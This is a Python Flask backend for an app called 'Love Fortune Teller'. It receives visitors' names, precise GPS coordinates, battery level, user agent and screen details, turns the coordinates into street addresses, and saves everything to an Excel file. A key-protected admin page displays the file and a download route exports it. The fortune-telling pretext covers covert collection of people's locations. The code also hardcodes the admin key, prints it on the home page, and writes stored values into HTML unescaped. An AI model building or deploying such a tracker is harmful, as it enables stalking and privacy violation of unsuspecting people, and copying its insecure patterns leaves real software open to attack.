from flask import Flask, request, jsonify, abort
from flask_cors import CORS
import pandas as pd
import requests
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

EXCEL_FILE = 'fortunes_data.xlsx'
ADMIN_SECRET = 'loveadmin2024'  # Change this password!

def init_excel():
    if not os.path.exists(EXCEL_FILE):
        df = pd.DataFrame(columns=['timestamp', 'name', 'latitude', 'longitude', 'accuracy', 'address', 'battery', 'userAgent', 'screen'])
        df.to_excel(EXCEL_FILE, index=False)

def geocode_reverse(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        resp = requests.get(url, headers={'User-Agent': 'LoveFortuneTeller/1.0'})
        data = resp.json()
        return data.get('display_name', 'Unknown')
    except:
        return 'Address unavailable'

@app.route('/')
def home():
    return "Love Fortune Teller Backend 💕 - Admin: /admin?key=loveadmin2024"

@app.route('/save', methods=['POST'])
def save_data():
    init_excel()
    data = request.json
    
    address = geocode_reverse(data['latitude'], data['longitude'])
    
    new_row = {
        'timestamp': datetime.now().isoformat(),
        'name': data['name'],
        'latitude': data['latitude'],
        'longitude': data['longitude'],
        'accuracy': data['accuracy'],
        'address': address,
        'battery': data['battery'],
        'userAgent': data['userAgent'],
        'screen': data['screen']
    }
    
    df = pd.read_excel(EXCEL_FILE)
    df = pd.concat([df, pd.DataFrame([new_row])], ignore_index=True)
    df.to_excel(EXCEL_FILE, index=False)
    
    return jsonify({'status': 'saved 💖'})

@app.route('/admin')
def admin():
    key = request.args.get('key')
    if key != ADMIN_SECRET:
        abort(403)  # Forbidden for wrong/no key
    
    if not os.path.exists(EXCEL_FILE):
        return "No love data yet 💕"
    
    df = pd.read_excel(EXCEL_FILE)
    html = """
    <h1>🔒 Private Love Data Admin 💋</h1>
    <p>Total Lovers: {} | Latest: {}</p>
    """.format(len(df), df['timestamp'].iloc[-1] if len(df)>0 else 'None')
    
    html += "<table border='1' style='border-collapse:collapse; width:100%;'>"
    html += "<tr style='background:#ff69b4'>"
    for col in df.columns:
        html += f"<th style='padding:8px; color:white;'>{col}</th>"
    html += "</tr>"
    
    for idx, row in df.iterrows():
        html += "<tr>"
        for val in row:
            html += f"<td style='padding:8px; border:1px solid #ddd;'>{val}</td>"
        html += "</tr>"
    html += "</table>"
    
    html += f"<br><a href='/download?key={ADMIN_SECRET}' style='background:#ff1493; color:white; padding:10px 20px; text-decoration:none; border-radius:5px;'>📥 Download Excel</a>"
    return html

@app.route('/download')
def download():
    key = request.args.get('key')
    if key != ADMIN_SECRET:
        abort(403)
    
    df = pd.read_excel(EXCEL_FILE)
    from io import BytesIO
    output = BytesIO()
    with pd.ExcelWriter(output, engine='openpyxl') as writer:
        df.to_excel(writer, index=False)
    output.seek(0)
    
    from flask import send_file
    return send_file(output, download_name='fortunes_data.xlsx', as_attachment=True)

if __name__ == '__main__':
    init_excel()
    app.run(host='0.0.0.0', port=5000)
